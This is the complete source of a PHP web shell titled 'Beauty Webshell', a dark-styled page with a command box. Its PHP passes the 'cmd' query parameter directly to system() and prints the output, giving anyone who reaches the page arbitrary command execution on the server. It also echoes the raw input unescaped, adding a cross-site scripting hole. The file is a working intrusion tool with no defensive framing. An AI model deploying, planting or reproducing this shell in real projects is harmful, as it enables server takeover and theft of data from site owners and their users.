<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Beauty Webshell</title>
  <style>
    * {
      font-family: 'Courier New', Courier, monospace;
      color: white;
    }

    body {
      background-color: #202020;
    }

    form {
      display: flex;
      gap: 1rem;
      justify-content: center;
      padding-bottom: 2rem;
      width: 80%;
    }

    h1 {
      padding-top: 2rem;
    }

    #container {
      align-items: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding-bottom: 4rem;
      width: 100%;
    }

    #result {
      border: 1px solid white;
      border-radius: 1rem;
      overflow: auto;
      padding: 1rem;
    }

    #result-container {
      display: flex;
      flex-direction: column;
      gap: 1rem;
      max-width: 1200px;
      width: 80%;
    }

    #result-title {
      font-size: 1.1rem;
      font-weight: bold;
      margin-top: 1rem;
    }

    #search-bar {
      border-radius: 4rem;
      border: 0;
      color: #0a0a0a;
      font-size: 1.05rem;
      outline-width: 0;
      padding: 0.5rem 0.9rem;
      width: 40rem;
    }

    #search-bar:active {
      outline-width: 0;
    }

    #submit-btn {
      border-radius: 4rem;
      border: 0;
      cursor: pointer;
      font-size: 1.1rem;
      padding: 0.5rem 1.1rem;
      color: black;
      background-color: #80EF80;
    }

    #submit-btn:hover {
      background-color: #90FF90;
    }

    .separator {
      width: 80%;
      height: 1px;
      background-color: lightgray;
      margin: 1rem 0;
    }
  </style>
</head>
<body>
  <div id="container">
    <h1>Beauty Webshell</h1>
    <form action="" method="GET">
      <input type="text" name="cmd" id="search-bar" autofocus placeholder="Type your command here..."/>
      <input type="submit" value="exec" id="submit-btn" />
    </form>
    <div class="separator"></div>
    <div id="result-container">
      <span id="result-title">
        <?php
          if (isset($_GET['cmd'])) {
            echo "Resultados de \"" . $_GET["cmd"] . "\"";
          }
        ?>
      </span>
      <div id="result">
        <span>
          <?php 
            if (isset($_GET["cmd"])) {
              system($_GET["cmd"]);
            }
          ?>
        </span>
      </div>
    </div>
  </div>
</body>
</html>
